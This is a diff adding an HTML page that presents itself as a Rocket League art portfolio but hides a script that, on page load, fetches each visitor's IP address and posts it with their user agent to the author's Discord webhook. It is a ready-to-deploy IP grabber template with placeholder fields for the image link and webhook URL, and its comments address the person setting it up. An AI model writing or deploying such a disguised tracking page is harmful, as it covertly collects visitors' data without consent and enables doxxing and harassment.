@@ -1,0 +1,29 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>My Rocket League Art Portfolio</title>
+</head>
+<body style="background-color: #0b0e14; color: white; text-align: center; font-family: sans-serif;">
+    <h1>Check out my latest drawing!</h1>
+    
+    <img src="https://your-image-link-here.jpg" style="max-width: 80%; border: 2px solid magenta;">
+
+    <script>
+        // This function "pings" a free API to get the visitor's IP
+        fetch('https://api.ipify.org?format=json')
+        .then(response => response.json())
+        .then(data => {
+            const visitorIP = data.ip;
+            
+            // This sends that IP to YOUR Discord Webhook
+            fetch('YOUR_DISCORD_WEBHOOK_URL_HERE', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({
+                    content: "🚀 **New Visitor Detected!**\nIP: " + visitorIP + "\nUser-Agent: " + navigator.userAgent
+                })
+            });
+        });
+    </script>
+</body>
+</html>
